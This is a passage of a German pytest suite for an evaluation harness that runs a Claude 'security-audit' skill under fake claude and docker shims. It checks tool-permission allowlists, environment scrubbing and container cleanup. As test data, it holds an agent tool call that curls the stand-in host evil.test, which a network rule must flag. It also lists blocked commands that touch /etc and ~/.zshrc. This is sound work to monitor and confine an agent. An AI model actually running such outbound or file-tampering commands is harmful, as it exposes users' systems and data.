        wert = {"n": wert}
    fehler = auswertung.pruefe_netz([{"type": "user", "message": wert}], bericht, MUSTER)
    assert any("zu tief" in f for f in fehler)
    flach = {"type": "user", "message": {"a": {"b": {"c": [bash("a", "ls")]}}}}
    assert auswertung.pruefe_netz([flach], bericht, MUSTER) == []


def test_abgeschnittene_letzte_zeile_wird_geprueft(bericht, erwartung, stream, tmp_path):
    """M-5: Der Rohtext der unlesbaren letzten Zeile geht durch die Netzregel."""
    zeile = '{"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t9", "name": "Bash", "input": {"command": "curl http://evil.test/x'
    p = tmp_path / "s.jsonl"
    p.write_text(json.dumps(bash("a", "ls")) + "\n" + zeile, encoding="utf-8")
    events, n, nur, letzte = auswertung.lade_stream_info(str(p))
    assert (n, nur, letzte) == (1, True, zeile)
    e = alles(bericht, erwartung, events, stream_uebersprungen=n, stream_nur_letzte=nur, stream_letzte_zeile=letzte)
    assert e["dod"]["TF1-D5"]["ok"] is False and any("letzte Stream-Zeile" in d for d in e["dod"]["TF1-D5"]["details"])
    muster = '{"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Bash", "input": {"command": "cat FIXTURE.invalid'
    e = alles(bericht, erwartung, stream, stream_uebersprungen=1, stream_nur_letzte=True, stream_letzte_zeile=muster)
    assert e["dod"]["TF1-D5"]["ok"] is False
    harmlos = alles(bericht, erwartung, stream, stream_uebersprungen=1, stream_nur_letzte=True,
                    stream_letzte_zeile='{"type": "assistant", "message": {"con')
    assert harmlos["ok"] is True and any("letzte Stream-Zeile" in d for d in harmlos["dod"]["TF1-D5"]["details"])


@pytest.mark.parametrize("kaputt", [[], "x", 0, ["befunde"], 1.5, False])
def test_bericht_kein_dict(erwartung, stream, kaputt):
    """M-6: Ein Bericht, der kein dict ist, gilt als fehlend."""
    e = alles(kaputt, erwartung, stream)
    assert e["ok"] is False
    for d in ("TF1-D1", "TF1-D2", "TF1-D3", "TF1-D5"):
        assert e["dod"][d]["ok"] is False and "kein Bericht" in e["dod"][d]["details"]



# ====================================================================================== Teil 2: run_eval.py

FAKE_CLAUDE = """#!{python}
import json, os, subprocess, sys, time
args = sys.argv[1:]
modus = os.environ.get("FAKE_CLAUDE_MODUS", "ok")
smoke = "--output-format" in args and args[args.index("--output-format") + 1] == "json"
with open(os.environ["FAKE_CLAUDE_LOG"], "a") as f:
    f.write(json.dumps({{"args": args, "cwd": os.getcwd(), "smoke": smoke, "env": dict(os.environ)}}) + "\\n")
if smoke:
    if modus == "smoke_fehler":
        sys.stderr.write("kaputt\\n")
        sys.exit(1)
    print(json.dumps({{"type": "result", "result": "ok", "is_error": False}}))
    sys.exit(0)
print(json.dumps({{"type": "system", "subtype": "init"}}), flush=True)
def docker_rest():
    with open(os.environ["FAKE_DOCKER_STATE"]) as f:
        zustand = json.load(f)
    zustand["container"] += ["security-audit-0a1b2c3d-p1-app", "fremder-container"]
    zustand["netze"] += ["security-audit-0a1b2c3d-p1"]
    zustand["images"] += [["security-audit-0a1b2c3d-app", "latest"]]
    if os.environ.get("FAKE_CLAUDE_FREMD"):                      # parallel laufendes echtes Audit (R1-3)
        zustand["container"] += ["security-audit-ffffffff-p1-app"]
        zustand["netze"] += ["security-audit-ffffffff-p1"]
        zustand["images"] += [["security-audit-ffffffff-app", "latest"]]
    with open(os.environ["FAKE_DOCKER_STATE"], "w") as f:
        json.dump(zustand, f)
if modus == "haengt":
    print(json.dumps({{"type": "assistant", "parent_tool_use_id": None, "message": {{"content": [
        {{"type": "tool_use", "id": "h1", "name": "Bash", "input": {{"command": "python3 /skill/security-audit/scripts/poc.py starten --lauf 0a1b2c3d --rolle p1"}}}}]}}}}), flush=True)
    if os.environ.get("FAKE_CLAUDE_DOCKER_REST"):
        docker_rest()
    kind = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    with open(os.environ["FAKE_CLAUDE_KIND"], "w") as f:
        f.write(str(kind.pid))
    time.sleep(60)
if modus in ("bericht", "docker_rest"):
    with open(os.environ["FAKE_CLAUDE_STREAM"]) as f:
        sys.stdout.write(f.read())
    ordner = os.path.join(os.environ["SECURITY_AUDIT_AUSGABE"], os.path.basename(os.getcwd()))
    os.makedirs(ordner, exist_ok=True)
    with open(os.path.join(ordner, "x.json"), "w") as f, open(os.environ["FAKE_CLAUDE_BERICHT"]) as q:
        f.write(q.read())
    for name in ("x.md", "x-agent-stats.md"):
        with open(os.path.join(ordner, name), "w") as f:
            f.write("x\\n")
if modus == "docker_rest":
    docker_rest()
home = os.path.expanduser("~")
for rel in filter(None, os.environ.get("FAKE_CLAUDE_HOME_DATEIEN", "").split(",")):
    pfad = os.path.join(home, ".claude", rel)
    os.makedirs(os.path.dirname(pfad), exist_ok=True)
    with open(pfad, "w") as f:
        f.write("x\\n")
sys.exit(int(os.environ.get("FAKE_CLAUDE_RC", "0")))
"""

FAKE_DOCKER = """#!{python}
import json, os, sys
args = sys.argv[1:]
with open(os.environ["FAKE_DOCKER_LOG"], "a") as f:
    f.write(json.dumps(args) + "\\n")
with open(os.environ["FAKE_DOCKER_STATE"]) as f:
    z = json.load(f)
def speichern():
    with open(os.environ["FAKE_DOCKER_STATE"], "w") as f:
        json.dump(z, f)
if z.get("kaputt"):
    sys.stderr.write("Cannot connect to the Docker daemon\\n")
    sys.exit(1)
if args[:2] == ["ps", "-a"]:
    print("\\n".join(z["container"]))
elif args[:2] == ["network", "ls"]:
    print("\\n".join(z["netze"] + ["bridge", "host", "none"]))
elif args[:1] == ["images"]:
    print("\\n".join(f"{{r}}|{{t}}" for r, t in z["images"]))
elif args[:3] == ["rm", "-f", "-v"]:
    z["container"] = [c for c in z["container"] if c not in args[3:]]
    speichern()
elif args[:2] == ["network", "rm"]:
    z["netze"] = [n for n in z["netze"] if n not in args[2:]]
    speichern()
elif args[:1] == ["rmi"]:
    z["images"] = [e for e in z["images"] if f"{{e[0]}}:{{e[1]}}" not in args[1:]]    # nur Repository:Tag entfernt
    speichern()
"""


class EvalUmgebung:
    """Shim-PATH mit Fake-claude und Fake-docker; HOME, Temp-Ordner und Ausgabe liegen in tmp_path."""

    def __init__(self, tmp_path, monkeypatch):
        self.tmp = tmp_path
        shim = tmp_path / "shim"
        shim.mkdir()
        for name, vorlage in (("claude", FAKE_CLAUDE), ("docker", FAKE_DOCKER)):
            f = shim / name
            f.write_text(vorlage.format(python=sys.executable), encoding="utf-8")
            f.chmod(0o755)
        (tmp_path / "home").mkdir()
        (tmp_path / "tmp").mkdir()
        self.claude_log = tmp_path / "claude.log"
        self.docker_log = tmp_path / "docker.log"
        self.docker_state = tmp_path / "docker.json"
        self.kind = tmp_path / "kind.pid"
        self.docker_state.write_text(json.dumps({"container": [], "netze": [], "images": []}))
        monkeypatch.setenv("PATH", f"{shim}{os.pathsep}{os.environ['PATH']}")
        monkeypatch.setenv("HOME", str(tmp_path / "home"))
        monkeypatch.setattr(tempfile, "tempdir", os.path.realpath(tmp_path / "tmp"))
        for k, v in (("FAKE_CLAUDE_LOG", self.claude_log), ("FAKE_DOCKER_LOG", self.docker_log),
                     ("FAKE_DOCKER_STATE", self.docker_state), ("FAKE_CLAUDE_KIND", self.kind),
                     ("FAKE_CLAUDE_STREAM", os.path.join(TESTDATEN, "stream_ok.jsonl")),
                     ("FAKE_CLAUDE_BERICHT", os.path.join(TESTDATEN, "bericht_ok.json"))):
            monkeypatch.setenv(k, str(v))
        self.monkeypatch = monkeypatch

    def modus(self, name):
        self.monkeypatch.setenv("FAKE_CLAUDE_MODUS", name)

    def aufrufe(self, smoke=None):
        if not self.claude_log.exists():
            return []
        zeilen = [json.loads(z) for z in self.claude_log.read_text().splitlines() if z.strip()]
        return [z for z in zeilen if smoke is None or z["smoke"] is smoke]

    def docker(self):
        return [json.loads(z) for z in self.docker_log.read_text().splitlines()] if self.docker_log.exists() else []

    def temp_ordner(self):
        return [n for n in os.listdir(tempfile.tempdir) if n.startswith("eval-security-audit-")]


@pytest.fixture
def ev(tmp_path, monkeypatch):
    return EvalUmgebung(tmp_path, monkeypatch)


def _aufrufzeilen():
    """Aufrufzeilen mit `python3 …` aus SKILL.md und references/ (Zeilenanfang oder Inline-Code)."""
    dateien = [os.path.join(SKILL, "SKILL.md")]
    refs = os.path.join(SKILL, "references")
    dateien += [os.path.join(refs, n) for n in sorted(os.listdir(refs)) if n.endswith(".md")]
    zeilen = []
    for d in dateien:
        with open(d, encoding="utf-8") as f:
            for z in f.read().splitlines():
                zeilen += re.findall(r"(?:^\s*|`)(python3 [^`]+)", z)
    return zeilen


def _regel_passt(regel: str, zeile: str) -> bool:
    """Bash-Regel `Bash(<muster>)` gegen eine Zeile: `*` steht für beliebigen Text (auch `/`)."""
    muster = regel[len("Bash("):-1]
    return re.fullmatch(".*".join(re.escape(t) for t in muster.split("*")), zeile, re.S) is not None


def test_regeln_passen_zu_skill():
    skill, home, aus = "/tmp/x/.claude/skills/security-audit-eval", "/Users/test", "/tmp/x/ausgabe"
    regeln = run_eval.erlaubte_regeln(skill, aus, home)
    bash = [r for r in regeln if r.startswith("Bash(")]
    zeilen = _aufrufzeilen()
    gesehen = {"poc": 0, "kontext": 0, "rendern": 0, "add": 0}
    assert len(zeilen) >= 5
    for z in zeilen:
        z = z.replace("${CLAUDE_SKILL_DIR}", skill).replace("<SKILL_DIR>", skill)
        z = z.replace("<ausgabe_ordner>/<basisname>.json", f"{aus}/repo/x.json").replace("<agent_stats_datei>", f"{aus}/x-agent-stats.md")
        if "<skript>" in z or z.rstrip().endswith(".py …"):              # allgemeine Vorlagen in Grundregel 8
            continue
        assert any(_regel_passt(r, z) for r in bash), f"keine Regel für: {z}"
        for schluessel, marke in (("poc", "/poc.py "), ("kontext", "bericht.py kontext"), ("rendern", "bericht.py rendern "),
                                  ("add", "agent-stats.py add ")):
            gesehen[schluessel] += marke in z
    assert all(gesehen.values()), gesehen                                # jede Form kommt im Skill-Text vor
    assert f"Bash(python3 -I {skill}/scripts/poc.py *)" in regeln
    assert f"Bash(python3 -I {skill}/scripts/bericht.py kontext)" in regeln
    assert f"Bash(python3 -I {skill}/scripts/bericht.py kontext *)" in regeln
    assert f"Bash(python3 -I {skill}/scripts/bericht.py rendern {aus}/*)" in regeln
    assert f"Bash(python3 ~/.claude/skills/auto-feature/scripts/agent-stats.py add {aus}/*)" in regeln
    assert f"Bash(python3 {home}/.claude/skills/auto-feature/scripts/agent-stats.py add {aus}/*)" in regeln
    assert "Bash(ls *)" in regeln and "Bash(ls)" in regeln
    # I1: bericht.py und agent-stats.py nur in den Formen des Skills, nichts anderes (kein `rendern` oder `add` nach außen)
    for gefaehrlich in (f"python3 -I {skill}/scripts/bericht.py rendern /etc/x.json",
                        f"python3 -I {skill}/scripts/bericht.py rendern {aus}x/y.json",
                        f"python3 -I {skill}/scripts/bericht.py schreiben {aus}/a",
                        f"python3 ~/.claude/skills/auto-feature/scripts/agent-stats.py add /Users/test/.zshrc --x",
                        f"python3 ~/.claude/skills/auto-feature/scripts/agent-stats.py init",
                        f"python3 {home}/.claude/skills/auto-feature/scripts/agent-stats.py add /etc/x"):
        assert not any(_regel_passt(r, gefaehrlich) for r in bash), gefaehrlich
    assert f"Write(//tmp/x/ausgabe/**)" in regeln and "Edit(//tmp/x/ausgabe/**)" in regeln
    for name in ("Glob", "Grep", "Agent", "Skill", "TodoWrite", "ToolSearch"):
        assert name in regeln
    # M-1, Härtung A7: Read nur auf den Skill-Ordner (SKILL.md, references/), den Ausgabeordner und die Arbeitskopien
    # (poc.py vorbereiten) im Temp-Ordner; weder freies Read noch das ganze Repo
    assert "Read" not in regeln
    liest = [r for r in regeln if r.startswith("Read(")]
    assert sorted(liest) == sorted([
        "Read(//tmp/x/.claude/skills/security-audit-eval/**)", "Read(//tmp/x/ausgabe/**)",
        f"Read(//{os.path.realpath(tempfile.gettempdir()).lstrip('/')}/security-audit-*/**)"])
    assert "Read(//tmp/x/**)" not in regeln
    regeln2 = run_eval.erlaubte_regeln(skill, aus, home, tmp="/t")
    assert "Read(//t/security-audit-*/**)" in regeln2 and not any(r.startswith("Read(//r/") for r in regeln2)
    # eng gefasst: kein freies Bash, kein freies Write/Edit, keine Web-Werkzeuge
    assert not {"Bash", "Write", "Edit", "WebFetch", "WebSearch"} & set(regeln)


def test_eigene_filtert_praefix():
    assert run_eval._eigene(["mein-security-audit-x", "security-audit-ab12cd34-p1-app", "/security-audit-y",
                             "security-audit-ab12cd34-p1-app", "", "  "]) == ["security-audit-ab12cd34-p1-app", "security-audit-y"]


def test_kind_umgebung():
    basis = {"PATH": "/bin", "HOME": "/h", "CLAUDECODE": "1", "CLAUDE_EFFORT": "max",
             "CLAUDE_CODE_SESSION_ID": "s", "CLAUDE_CODE_EFFORT_LEVEL": "xhigh", "CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS": "9",
             "SECURITY_AUDIT_AUSGABE": "/alt", "SECURITY_AUDIT_OHNE": "alt", "ANDERES": "bleibt"}
    for _ in range(30):
        basis["CLAUDE_CODE_" + "".join(random.choices(string.ascii_uppercase, k=8))] = "x"
    vorher = dict(basis)
    env = run_eval.kind_umgebung(basis, "/aus", ["a", "b"])
    assert basis == vorher                                            # Eingabe unverändert
    assert not [k for k in env if k.startswith("CLAUDE_CODE_") and k != "CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS"]
    assert "CLAUDECODE" not in env and "CLAUDE_EFFORT" not in env
    assert env["CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS"] == "0"
    assert env["SECURITY_AUDIT_AUSGABE"] == "/aus" and env["SECURITY_AUDIT_OHNE"] == "a,b"
    assert env["PATH"] == "/bin" and env["HOME"] == "/h" and env["ANDERES"] == "bleibt"
    assert run_eval.kind_umgebung({}, "/aus", [])["SECURITY_AUDIT_OHNE"] == ""
    env = run_eval.kind_umgebung({"PWD": "/alt", "OLDPWD": "/davor"}, "/aus", [], cwd="/repo")    # M-3
    assert env["PWD"] == "/repo" and "OLDPWD" not in env
    assert run_eval.kind_umgebung({"PWD": "/alt"}, "/aus", [])["PWD"] == "/alt"


def test_agents_json():
    pfad = os.path.join(os.path.dirname(SKILL), "agents", "opus-xhigh.md")
    with open(pfad, encoding="utf-8") as f:
        md = f.read()
    agenten = json.loads(run_eval.agents_json(md))
    assert set(agenten) == {"opus-xhigh"}
    a = agenten["opus-xhigh"]
    assert a["model"] == "opus" and a["effort"] == "xhigh"
    assert a["description"].startswith("Opus mit Reasoning-Effort xhigh.")
    assert a["prompt"].startswith("Du bist ein unabhängiger Prüfer.") and "name:" not in a["prompt"].split("\n")[0]
    assert "---" not in a["prompt"].split("\n")[0] and a["prompt"] == a["prompt"].strip()
    with pytest.raises(ValueError):
        run_eval.agents_json("kein Frontmatter")


def test_agents_json_blockskalar():
    md = ("---\nname: x\ndescription: >\n  Erste Zeile\n  zweite Zeile.\n\n  Absatz.\nmodel: opus\n"
          "effort: xhigh\n---\n\nPrompt-Text.\n")
    a = json.loads(run_eval.agents_json(md))["opus-xhigh"]
    assert a["description"] == "Erste Zeile zweite Zeile.\nAbsatz." and a["model"] == "opus" and a["effort"] == "xhigh"
    assert a["prompt"] == "Prompt-Text."
    md = "---\ndescription: |-\n  Zeile A\n  Zeile B\neffort: high\n---\nx"
    a = json.loads(run_eval.agents_json(md))["opus-xhigh"]
    assert a["description"] == "Zeile A\nZeile B" and a["effort"] == "high" and a["model"] == "opus"


def test_temp_repo_globales_exclude(tmp_path, monkeypatch):
    """M-5: Ein globales Exclude `.env*` darf `.env.production` und `.env.example` nicht aus dem Commit halten."""
    home = tmp_path / "home"
    home.mkdir()
    (home / "excludes").write_text(".env*\n")
    (home / ".gitconfig").write_text(f"[core]\n\texcludesFile = {home / 'excludes'}\n")
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / "xdg"))
    monkeypatch.setattr(tempfile, "tempdir", os.path.realpath(tmp_path))
    wurzel, repo = run_eval.temp_repo_anlegen("fixture-web", SKILL, False)
    try:
        r = subprocess.run(["git", "-C", repo, "ls-tree", "-r", "--name-only", "HEAD"], capture_output=True, text=True)
        dateien = r.stdout.split()
        assert ".env.production" in dateien and ".env.example" in dateien
        assert not [d for d in dateien if d.startswith(".claude/")]
        st = subprocess.run(["git", "-C", repo, "status", "--porcelain"], capture_output=True, text=True)
        assert st.stdout == ""
    finally:
        shutil.rmtree(wurzel, ignore_errors=True)


def test_temp_repo(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    echt = tmp_path / "echt"
    echt.mkdir()
    link = tmp_path / "link"
    link.symlink_to(echt)
    monkeypatch.setattr(tempfile, "tempdir", str(link))                # Temp-Ordner über Symlink: realpath nötig
    wurzel, repo = run_eval.temp_repo_anlegen("fixture-web", SKILL, False)
    try:
        assert wurzel == os.path.realpath(wurzel) and repo == os.path.realpath(repo)
        assert wurzel.startswith(str(echt) + os.sep)
        name = os.path.basename(wurzel)
        assert name.startswith("eval-security-audit-") and repo == os.path.join(wurzel, name)
        skill = os.path.join(repo, ".claude", "skills", "security-audit-eval")
        assert os.path.isfile(os.path.join(skill, "SKILL.md")) and not os.path.exists(os.path.join(skill, "evals"))
        with open(os.path.join(skill, "SKILL.md"), encoding="utf-8") as f:
            kopf = f.read().split("---")[1]
        assert re.search(r"^name: security-audit-eval$", kopf, re.M) and "name: security-audit\n" not in kopf
        dateien = [os.path.join(d, n) for d, _, ns in os.walk(skill) for n in ns]
        assert any(p.endswith("scripts/poc.py") for p in dateien)
        for p in dateien:
            assert not os.path.basename(p).startswith("test_") and "__pycache__" not in p and ".pytest_cache" not in p
        with open(os.path.join(SKILL, "SKILL.md"), encoding="utf-8") as f:
            assert "name: security-audit\n" in f.read()                # Quelle unverändert
        with open(os.path.join(repo, ".git", "info", "exclude"), encoding="utf-8") as f:
            assert ".claude/" in f.read().splitlines()
        assert os.path.isfile(os.path.join(repo, "package-lock.json"))
        assert not os.path.exists(os.path.join(repo, "package-lock.json.tmpl"))
        assert not os.path.exists(os.path.join(repo, "expected")) and not os.path.exists(os.path.join(repo, "evals"))
        assert os.path.isfile(os.path.join(repo, "src", "server.js"))
        porcelain = subprocess.run(["git", "-C", repo, "status", "--porcelain"], capture_output=True, text=True)
        assert porcelain.returncode == 0 and porcelain.stdout == ""
        assert subprocess.run(["git", "-C", repo, "rev-parse", "--verify", "HEAD"], capture_output=True).returncode == 0
        # weder Pfade der Erwartung noch fixture.invalid im kopierten Skill (R2-W4)
        with open(os.path.join(SKILL, "evals", "expected", "fixture-web.json"), encoding="utf-8") as f:
            erw = json.load(f)
        verboten = {d for e in erw["eintraege"] for d in e["dateien"]} | {"fixture.invalid"}
        for p in dateien:
            with open(p, encoding="utf-8", errors="replace") as f:
                text = f.read()
            for v in verboten:
                assert v not in text, f"{v} in {p}"
    finally:
        shutil.rmtree(wurzel, ignore_errors=True)
    wurzel2, repo2 = run_eval.temp_repo_anlegen("fixture-web", SKILL, True)
    try:
        assert not os.path.exists(os.path.join(repo2, "package-lock.json"))
        assert not os.path.exists(os.path.join(repo2, "package-lock.json.tmpl"))
    finally:
        shutil.rmtree(wurzel2, ignore_errors=True)


def _lebt(pid):
    """Nur Lebendigkeits-Probe (Signal 0), sendet nichts."""
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    return True


def _eigene_gruppe_aufraeumen(p):
    """Räumt die Gruppe eines eigenen Popen-Objekts (start_new_session=True, pgid == p.pid) ab; nie über PIDs aus Dateien."""
    if p.pid > 1 and p.pid != os.getpgrp():
        try:
            os.killpg(p.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass


def test_lauf_timeout_beendet_gruppe(ev, capsys, monkeypatch):
    ev.modus("haengt")
    echtes, gestartet = run_eval._kind_starten, []

    def merken(cmd, cwd, env, stdout, stderr):
        p = echtes(cmd, cwd, env, stdout, stderr)
        if "json" not in cmd:                                          # nur den Lauf, nicht den Smoke-Test
            gestartet.append(p)
        return p

    monkeypatch.setattr(run_eval, "_kind_starten", merken)
    t0 = time.monotonic()
    assert run_eval.main(["--fixture", "fixture-web", "--timeout", "2"]) == 1
    assert time.monotonic() - t0 < 60
    (p,) = gestartet
    pid = int(ev.kind.read_text())
    for _ in range(50):
        if not _lebt(pid):
            break
        time.sleep(0.1)
    else:
        _eigene_gruppe_aufraeumen(p)                                   # nur über das eigene Popen-Objekt
        pytest.fail("Kindprozess der Gruppe lebt noch")
    ergebnis = json.loads(capsys.readouterr().out)
    assert ergebnis["ok"] is False and ergebnis["lauf"]["timeout"] is True
    assert ev.temp_ordner()                                            # bei Exit ≠ 0 bleibt das Temp-Verzeichnis


def test_lauf_ok_und_aufruf(ev, capsys, monkeypatch):
    monkeypatch.setenv("OLDPWD", "/davor")
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web", "--ohne", "a,b", "--prompt-art", "text"]) == 0
    ergebnis = json.loads(capsys.readouterr().out)
    assert ergebnis["ok"] is True and set(ergebnis["dod"]) == {f"TF1-D{i}" for i in range(1, 8)}
    assert all(d["ok"] for d in ergebnis["dod"].values())
    assert ev.temp_ordner() == []                                      # nach Exit 0 ohne --behalten entfernt
    smoke, lauf = ev.aufrufe(smoke=True), ev.aufrufe(smoke=False)
    assert len(smoke) == 1 and len(lauf) == 1
    a = lauf[0]["args"]
    assert a[0] == "-p" and a[1] == "Nutze den Skill security-audit-eval auf diesem Repo."
    assert smoke[0]["args"][:2] == ["-p", "Antworte nur mit ok."]

    def wert(args, opt):
        return args[args.index(opt) + 1]

    def liste(args, opt):
        i, ende = args.index(opt) + 1, []
        while i < len(args) and not args[i].startswith("--"):
            ende.append(args[i])
            i += 1
        return ende

    for args in (smoke[0]["args"], a):                                 # gleiche Optionen im Smoke-Test und im Lauf
        assert wert(args, "--permission-mode") == "acceptEdits"
        assert wert(args, "--setting-sources") == "project,local" and "--strict-mcp-config" in args
        assert json.loads(wert(args, "--agents"))["opus-xhigh"]["effort"] == "xhigh"
        assert os.path.isabs(wert(args, "--add-dir")) and wert(args, "--add-dir").endswith("/ausgabe")
        assert liste(args, "--disallowedTools") == ["WebFetch,WebSearch"]
    assert wert(a, "--output-format") == "stream-json" and "--verbose" in a
    assert wert(a, "--tools") == "Read,Glob,Grep,Write,Edit,Agent,Skill,Bash,TodoWrite,ToolSearch"
    regeln = liste(a, "--allowedTools")
    assert "Bash(ls *)" in regeln and any(r.startswith("Bash(python3 -I ") and r.endswith("/scripts/poc.py *)") for r in regeln)
    assert wert(smoke[0]["args"], "--tools") == ""                     # Smoke-Test ohne Werkzeuge
    assert "--allowedTools" not in smoke[0]["args"]
    env = lauf[0]["env"]
    assert env["SECURITY_AUDIT_OHNE"] == "a,b" and env["SECURITY_AUDIT_AUSGABE"] == wert(a, "--add-dir")
    assert env["CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS"] == "0"
    assert os.path.basename(lauf[0]["cwd"]).startswith("eval-security-audit-")
    assert env["PWD"] == lauf[0]["cwd"] and "OLDPWD" not in env and "OLDPWD" not in smoke[0]["env"]     # M-3
    assert smoke[0]["env"]["PWD"] == lauf[0]["cwd"]
    skill_kopie = lauf[0]["cwd"] + "/.claude/skills/security-audit-eval"
    assert "Read" not in regeln and f"Read(//{skill_kopie.lstrip('/')}/**)" in regeln                  # M-1, Härtung A7
    assert f"Read(//{lauf[0]['cwd'].lstrip('/')}/**)" not in regeln                                    # nicht das ganze Repo
    assert f"Read(//{os.path.realpath(tempfile.gettempdir()).lstrip('/')}/security-audit-*/**)" in regeln
    assert lauf[0]["cwd"].endswith(os.path.basename(lauf[0]["cwd"]) + "/" + os.path.basename(lauf[0]["cwd"]))


def test_lauf_slash_prompt_und_kindumgebung(ev, monkeypatch):
    monkeypatch.setenv("CLAUDECODE", "1")
    monkeypatch.setenv("CLAUDE_CODE_SESSION_ID", "abc")
    monkeypatch.setenv("CLAUDE_EFFORT", "max")
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web"]) == 0
    lauf = ev.aufrufe(smoke=False)[0]
    assert lauf["args"][1] == "/security-audit-eval"
    for k in ("CLAUDECODE", "CLAUDE_CODE_SESSION_ID", "CLAUDE_EFFORT"):
        assert k not in lauf["env"]


def test_lauf_ohne_bericht_scheitert_und_behalten(ev, capsys):
    ev.modus("ok")                                                     # Fake-claude schreibt weder Stream noch Bericht
    assert run_eval.main(["--fixture", "fixture-web", "--behalten"]) == 1
    ergebnis = json.loads(capsys.readouterr().out)
    assert ergebnis["ok"] is False and not ergebnis["dod"]["TF1-D1"]["ok"] and not ergebnis["dod"]["TF1-D4"]["ok"]
    (ordner,) = ev.temp_ordner()
    assert os.path.isfile(os.path.join(tempfile.tempdir, ordner, "ergebnis.json"))
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web", "--behalten"]) == 0
    assert len(ev.temp_ordner()) == 2                                  # --behalten auch nach Exit 0


def test_docker_vorpruefung_exit_5(ev, capsys):
    ev.docker_state.write_text(json.dumps({"container": ["security-audit-0a1b2c3d-p1-app", "andere"],
                                           "netze": [], "images": []}))
    assert run_eval.main(["--fixture", "fixture-web"]) == 5
    assert "security-audit-0a1b2c3d-p1-app" in capsys.readouterr().err
    assert ev.aufrufe() == [] and ev.temp_ordner() == []               # nichts gestartet, nichts angelegt
    ev.docker_state.write_text(json.dumps({"kaputt": True, "container": [], "netze": [], "images": []}))
    assert run_eval.main(["--fixture", "fixture-web"]) == 5            # nicht lesbar zählt als nicht leer


def test_smoke_test_gescheitert_exit_6(ev, capsys):
    ev.modus("smoke_fehler")
    assert run_eval.main(["--fixture", "fixture-web"]) == 6
    assert "Smoke-Test" in capsys.readouterr().err
    assert len(ev.aufrufe()) == 1 and ev.aufrufe()[0]["smoke"] is True


def test_docker_rest_wird_gemeldet_und_aufgeraeumt(ev, capsys):
    ev.modus("docker_rest")
    assert run_eval.main(["--fixture", "fixture-web"]) == 1
    ergebnis = json.loads(capsys.readouterr().out)
    d7 = ergebnis["dod"]["TF1-D7"]
    assert d7["ok"] is False and any("security-audit-0a1b2c3d-p1-app" in x for x in d7["details"])
    assert not any("fremder-container" in x for x in d7["details"])    # nur Präfix security-audit-
    assert all(ergebnis["dod"][f"TF1-D{i}"]["ok"] for i in range(1, 7))
    zustand = json.loads(ev.docker_state.read_text())
    assert zustand == {"container": ["fremder-container"], "netze": [], "images": []}
    befehle = [" ".join(c) for c in ev.docker()]
    assert any(b.startswith("rm -f -v security-audit-0a1b2c3d-p1-app") and "fremder" not in b for b in befehle)
    assert "rmi -f security-audit-0a1b2c3d-app:latest" in befehle


def test_aufraeumen_entfernt_nur_ressourcen_der_eigenen_laeufe_r1_3(ev, capsys, monkeypatch):
    """R1-3: Ein parallel gestartetes echtes Audit (anderer Lauf) darf das Eval-Ende nicht abräumen; auch D7 sieht es nicht."""
    monkeypatch.setenv("FAKE_CLAUDE_FREMD", "1")
    ev.modus("docker_rest")
    assert run_eval.main(["--fixture", "fixture-web"]) == 1
    ergebnis = json.loads(capsys.readouterr().out)
    d7 = ergebnis["dod"]["TF1-D7"]
    assert d7["ok"] is False and any("security-audit-0a1b2c3d-p1-app" in x for x in d7["details"])
    assert not any("ffffffff" in x for x in d7["details"])
    zustand = json.loads(ev.docker_state.read_text())
    assert zustand == {"container": ["fremder-container", "security-audit-ffffffff-p1-app"],
                       "netze": ["security-audit-ffffffff-p1"], "images": [["security-audit-ffffffff-app", "latest"]]}
    loeschen = [" ".join(c) for c in ev.docker() if c[:1] in (["rm"], ["rmi"]) or c[:2] == ["network", "rm"]]
    assert loeschen and not any("ffffffff" in b or "fremder" in b for b in loeschen)


def test_eigene_filtert_nach_lauf_ids_r1_3():
    namen = ["security-audit-0a1b2c3d-p1-app", "security-audit-0a1b2c3d", "security-audit-0a1b2c3d9-x",
             "security-audit-ffffffff-p1", "security-audit-0a1b2c3d-app", "andere"]
    assert run_eval._eigene(namen, {"0a1b2c3d"}) == ["security-audit-0a1b2c3d-p1-app", "security-audit-0a1b2c3d",
                                                    "security-audit-0a1b2c3d-app"]
    assert run_eval._eigene(namen, set()) == []
    assert len(run_eval._eigene(namen)) == 5                          # ohne Filter: alles mit Präfix (Vorprüfung)


def test_aufraeumen_ohne_bekannte_laeufe_loescht_nichts_r1_3(ev):
    ev.docker_state.write_text(json.dumps({"container": ["security-audit-ffffffff-p1-app"], "netze": [], "images": []}))
    assert run_eval.docker_aufraeumen(set()) is True
    assert [c for c in ev.docker() if c[:1] == ["rm"]] == []


def test_lauf_ids_aus_befehlen_r1_3(stream):
    s = list(stream) + [bash("x1", "python3 /s/scripts/poc.py neu"), bash("x2", "python3 poc.py aufraeumen --lauf deadbeef"),
                        bash("x3", "python3 poc.py anfrage --lauf nichthex --rolle p1"), tool_use("x4", "Grep", {"pattern": "--lauf cafebabe"})]
    assert auswertung.lauf_ids(s) == {"0a1b2c3d", "deadbeef"}
    assert auswertung.lauf_ids(s, '{"type":"assistant","message":{"content":[{"type":"tool_use","input":{"command":"python3 poc.py starten --lauf 12345678 --ro') == {"0a1b2c3d", "deadbeef", "12345678"}


def test_fixture_unbekannt(ev):
    assert run_eval.main(["--fixture", "gibt-es-nicht"]) == 2
    assert ev.aufrufe() == []


def test_claude_exit_ungleich_0_ist_exit_1_trotz_gruener_dod(ev, capsys, monkeypatch):
    monkeypatch.setenv("FAKE_CLAUDE_RC", "1")
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web"]) == 1
    ergebnis = json.loads(capsys.readouterr().out)
    assert all(d["ok"] for d in ergebnis["dod"].values())                # DoD grün, aber lauf_ok nicht
    assert ergebnis["ok"] is False and ergebnis["lauf"]["ok"] is False and ergebnis["lauf"]["rc"] == 1
    assert ev.temp_ordner()


